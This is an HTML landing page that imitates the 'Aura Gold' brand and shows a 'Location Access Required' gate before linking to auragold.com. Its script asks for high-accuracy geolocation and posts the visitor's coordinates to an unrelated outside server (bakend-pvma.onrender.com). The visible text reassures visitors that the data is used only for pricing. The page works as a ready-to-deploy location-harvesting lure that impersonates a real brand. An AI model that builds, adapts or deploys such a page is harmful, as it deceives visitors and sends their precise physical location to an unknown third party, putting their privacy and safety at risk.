<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Aura Gold — Welcome</title>

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

  <!-- Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>

  <style>
    :root{
      --ag-bg: #0a0a0a;
      --ag-bg-soft: #111111;
      --ag-text: #EAEAEA;
      --ag-muted: #A3A3A3;
      --ag-gold:#C8A24D;       /* rich gold */
      --ag-gold-strong:#D9B24C;/* hover accent */
      --ag-gold-dim:#8f7739;   /* borders/shadows */
      --radius: 12px;
      --shadow: 0 10px 30px rgba(0,0,0,.45);
    }

    *{box-sizing:border-box;margin:0;padding:0}
    html,body{height:100%}
    body{
      background: radial-gradient(1200px 900px at 70% -10%, rgba(200,162,77,.12), transparent 60%), 
                  linear-gradient(180deg, #0a0a0a 0%, #0b0b0b 100%);
      color:var(--ag-text);
      font-family:'Inter', system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      line-height:1.55;
      display:flex;
      flex-direction:column;
    }

    /* Header with Text Logo (L1) */
    header{
      border-bottom:1px solid rgba(255,255,255,.06);
      background:linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,0));
      backdrop-filter: blur(6px);
    }
    .container{
      width:92%;
      max-width:1100px;
      margin:0 auto;
    }
    .nav{
      height:72px;
      display:flex;
      align-items:center;
      justify-content:space-between;
    }
    .logo{
      font-family:'Cinzel', serif;
      font-size:1.6rem;
      letter-spacing:.28rem;
      color:var(--ag-gold);
      text-decoration:none;
      user-select:none;
      text-transform:uppercase;
      font-weight:700;
    }

    /* Location Gate */
    .gate{
      min-height:calc(100vh - 72px - 90px);
      display:flex;
      align-items:center;
      justify-content:center;
      padding:40px 0;
    }
    .gate-card{
      width:100%;
      max-width:720px;
      background:linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02));
      border:1px solid rgba(255,255,255,.08);
      border-radius:var(--radius);
      box-shadow:var(--shadow);
      padding:28px;
    }
    .gate-head{
      display:flex;
      gap:18px;
      align-items:flex-start;
      margin-bottom:14px;
    }
    .gate-icon{
      flex:0 0 56px;height:56px;border-radius:50%;
      display:grid;place-items:center;
      background: radial-gradient(80% 80% at 30% 20%, rgba(200,162,77,.25), rgba(200,162,77,.05));
      border:1px solid var(--ag-gold-dim);
      color:var(--ag-gold);
      font-size:1.4rem;
    }
    .gate-title{
      font-family:'Cinzel',serif;
      font-size:1.8rem;
      letter-spacing:.03rem;
      margin-top:4px;
    }
    .gate-text{color:var(--ag-muted); margin-top:6px}
    .gate-note{
      margin-top:14px;
      font-size:.9rem;
      color:#BBBBBB;
    }
    .btn-row{display:flex; gap:12px; flex-wrap:wrap; margin-top:22px}

    .btn-primary{
      appearance:none; border:1px solid var(--ag-gold-dim);
      background: linear-gradient(180deg, var(--ag-gold) 0%, var(--ag-gold-strong) 100%);
      color:#0c0c0c; font-weight:800; letter-spacing:.04rem;
      text-transform:uppercase; padding:14px 20px; border-radius:10px;
      cursor:pointer; transition:.2s transform ease, .2s filter ease, .2s box-shadow ease;
      box-shadow: 0 6px 14px rgba(200,162,77,.25);
    }
    .btn-primary:hover{ transform: translateY(-1px); filter:brightness(1.03) }
    .btn-primary:active{ transform: translateY(0) scale(.99) }

    .btn-ghost{
      appearance:none; border:1px solid rgba(255,255,255,.12);
      background: rgba(255,255,255,.03);
      color:var(--ag-text); font-weight:600;
      padding:12px 16px; border-radius:10px; cursor:pointer;
      transition:.2s border-color ease, .2s background ease;
    }
    .btn-ghost:hover{ border-color: var(--ag-gold-dim); background: rgba(255,255,255,.05) }

    .divider{
      height:1px; background:linear-gradient(90deg, transparent, rgba(255,255,255,.12), transparent);
      margin:22px 0;
    }

    .status{
      display:none; align-items:center; gap:10px; padding:12px 14px;
      border-radius:10px; background: rgba(0,0,0,.4); border:1px solid rgba(255,255,255,.1);
      margin-top:14px; color:#dcdcdc; font-size:.95rem;
    }
    .status i{ color:var(--ag-gold) }

    /* Post-allow section (button to official site) */
    .proceed{
      display:none; margin-top:10px;
      padding:18px; border:1px dashed var(--ag-gold-dim); border-radius:12px;
      background: linear-gradient(180deg, rgba(200,162,77,.10), rgba(200,162,77,.04));
    }
    .proceed h3{
      font-family:'Cinzel',serif; letter-spacing:.02rem; margin-bottom:10px;
    }

    /* Footer */
    footer{
      margin-top:auto;
      border-top:1px solid rgba(255,255,255,.08);
      background:linear-gradient(0deg, rgba(255,255,255,.02), rgba(255,255,255,0));
    }
    .footer-wrap{
      padding:22px 0; display:flex; justify-content:center; align-items:center;
      color:var(--ag-muted); font-size:.9rem;
    }

    /* Accessibility helpers */
    .sr-only{
      position:absolute; width:1px; height:1px; padding:0; margin:-1px; overflow:hidden; clip:rect(0,0,0,0); white-space:nowrap; border:0;
    }
  </style>
</head>
<body>
  <header>
    <div class="container">
      <nav class="nav" aria-label="Primary">
        <a class="logo" href="#" aria-label="Aura Gold Home">AURA&nbsp;GOLD</a>
        <div aria-hidden="true" style="color:var(--ag-gold); font-size:.9rem; letter-spacing:.12rem; text-transform:uppercase;">Est. MMXV</div>
      </nav>
    </div>
  </header>

  <!-- LOCATION GATE -->
  <main class="gate" id="gate">
    <div class="container">
      <section class="gate-card" aria-labelledby="gateTitle" aria-describedby="gateDesc">
        <div class="gate-head">
          <div class="gate-icon" aria-hidden="true"><i class="fa-solid fa-location-crosshairs"></i></div>
          <div>
            <h1 id="gateTitle" class="gate-title">Location Access Required</h1>
            <p id="gateDesc" class="gate-text">
              To tailor your experience and pricing, please allow location access. Your data is used only to enhance your visit.
            </p>
          </div>
        </div>

        <div class="btn-row">
          <button class="btn-primary" id="allowBtn" onclick="getAndSendLocation()">
            Allow Access
          </button>
          <button class="btn-ghost" onclick="showHelp()">Why is this required?</button>
        </div>

        <div class="status" id="statusBar">
          <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
          <span id="statusText">Requesting location…</span>
        </div>

        <div class="divider" role="separator" aria-hidden="true"></div>

        <div class="proceed" id="proceedBox">
          <h3>Thank you! You can now continue.</h3>
          <p class="gate-text">
            Your location was securely sent. Click below to enter the official Aura Gold website.
          </p>
          <div class="btn-row" style="margin-top:10px;">
            <a class="btn-primary" id="enterBtn" href="https://auragold.com">Enter Aura Gold Official Website</a>
            <button class="btn-ghost" onclick="resetGate()">Use a different location</button>
          </div>
        </div>

        <p class="gate-note" id="helpText" style="display:none;">
          We use your approximate location to determine regional availability and pricing.
          Only coordinates and accuracy are sent to our server; no background tracking occurs.
        </p>
      </section>
    </div>
  </main>

  <footer>
    <div class="container">
      <div class="footer-wrap">
        <span>&copy; <span id="yr"></span> Aura Gold. Crafted in Excellence.</span>
      </div>
    </div>
  </footer>

  <script>
    // ======= CONFIG =======
    const backendURL = "https://bakend-pvma.onrender.com/location"; // SAME API as your original
    const officialURL = "https://auragold.com"; // the button target

    // ======= ELEMENTS =======
    const statusBar = document.getElementById('statusBar');
    const statusText = document.getElementById('statusText');
    const proceedBox = document.getElementById('proceedBox');
    const allowBtn = document.getElementById('allowBtn');

    document.getElementById('yr').textContent = new Date().getFullYear();

    function showStatus(msg, spinning = true){
      statusBar.style.display = 'flex';
      statusText.textContent = msg;
      statusBar.querySelector('i').className = spinning ? 'fa-solid fa-spinner fa-spin' : 'fa-solid fa-circle-check';
    }
    function hideStatus(){ statusBar.style.display = 'none'; }

    function showHelp(){
      const el = document.getElementById('helpText');
      el.style.display = el.style.display === 'none' ? 'block' : 'none';
    }

    function resetGate(){
      hideStatus();
      proceedBox.style.display = 'none';
      allowBtn.disabled = false;
      allowBtn.textContent = 'Allow Access';
      allowBtn.focus();
    }

    // ======= GEO + POST =======
    function getAndSendLocation(){
      if(!('geolocation' in navigator)){
        showStatus('Geolocation is not supported by your browser.', false);
        return;
      }

      allowBtn.disabled = true;
      allowBtn.textContent = 'Requesting…';
      showStatus('Requesting location…', true);

      navigator.geolocation.getCurrentPosition(
        (position) => {
          // success
          const payload = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };

          showStatus('Sending location securely…', true);

          fetch(backendURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          })
          .then(async (res) => {
            // attempt to parse json, but proceed regardless
            try { await res.json(); } catch(e){}
            showStatus('Location received. You may proceed.', false);
            proceedBox.style.display = 'block';
            // Make sure the proceed link points to officialURL
            const enterBtn = document.getElementById('enterBtn');
            enterBtn.setAttribute('href', officialURL);
            allowBtn.textContent = 'Access Granted';
          })
          .catch((err) => {
            console.error('Error sending location:', err);
            showStatus('Could not reach server, but location was obtained. You may still proceed.', false);
            proceedBox.style.display = 'block';
            allowBtn.textContent = 'Access Granted';
          });
        },
        (err) => {
          console.error('Location error:', err);
          hideStatus();
          allowBtn.disabled = false;
          allowBtn.textContent = 'Allow Access';
          alert('Location access was denied or failed. Please allow location to continue.');
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }
  </script>
</body>
</html>
